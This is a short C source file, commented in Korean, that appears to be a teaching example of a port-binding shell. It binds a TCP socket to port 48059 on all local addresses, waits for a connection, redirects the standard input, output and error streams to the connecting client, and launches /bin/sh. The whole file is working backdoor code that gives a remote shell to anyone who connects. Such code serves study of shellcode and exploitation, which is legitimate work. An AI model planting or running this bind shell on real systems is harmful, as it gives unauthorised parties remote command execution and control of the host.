#include<sys/socket.h>			// 소켓을 만드는 데 사용할 라이브러리
#include<netinet/in.h>			// sockaddr 구조체 정의
int main(){
	char * shell[2];		// execve 호출 준비
	int server,client;		// 파일 기술자 핸들
	struct sockaddr_in serv_addr;	// IP/포트 값 저장용 구조체

	server=socket(2,1,0);		// 스트림 형태의 로컬 IP 소켓 만들기
	serv_addr.sin_addr.s_addr=0; 	// 모든 로컬호스트 IP에 소켓 주소를 설정
	serv_addr.sin_port=0xBBBB;	// 소켓 포트 설정, 여기서는 48059
	serv_addr.sin_family=2;		// 네이티브 프로토콜 패밀리: IP
	bind(server,(struct sockaddr *)&serv_addr,0x10); // 소켓 연결
	listen(server,0);		// 연결 대기 상태 시작
	client=accept(server,0,0);	// 연결되면 클라이언트 핸들 반환
	/* 클라이언트 파이프를 stdin,stdout,stderr에 연결 */
	dup2(client,0);			// stdin을 클라이언트에 연결
	dup2(client,1);			// stdout를 클라이언트에 연결
	dup2(client,2);			// stderr를 클라이언트에 연결
	shell[0]="/bin/sh";		// execve의 첫 번째 인수
	shell[1]=0;			// 배열을 null로 초기화
	execve(shell[0],shell,0);	// 셸을 팝
}
